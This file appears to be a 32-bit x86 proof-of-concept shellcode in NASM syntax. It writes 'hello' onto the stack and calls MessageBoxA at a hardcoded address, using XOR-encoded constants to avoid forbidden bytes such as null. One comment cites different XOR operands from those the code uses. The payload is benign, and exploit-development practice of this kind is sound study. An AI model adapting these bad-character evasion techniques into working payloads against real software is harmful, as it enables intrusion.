BITS 32
mov    ebx,esp
mov    eax, 0x41414141
xor    eax, 0x41415141 ; eax now has 0x1000
sub    ebx, eax
mov    ecx,ebx ; ecx will be used later

mov    byte [ebx], 'h'
inc    ebx
mov    byte [ebx], 'e'
inc    ebx
mov    byte [ebx], 'l'
inc    ebx
mov    byte [ebx], 'l'
inc    ebx
mov    byte [ebx], 'o'
inc    ebx
xor    edx,edx        ; need end string with 0x00 but can't use "mov" with 0x00 because that's no an allowed char
mov    byte [ebx],dl ; dl has 0x00

mov    ebx, 0x30719334 ; set xor key
xor    ebx, 0x30303030 ; xor out messageboxa location (0x42425242 ^ 0x4203e146 = 0x0041A304)
mov    ebx, [ebx]
push   edx ; 0
push   ecx
push   ecx
push   edx ; 0
call   ebx 
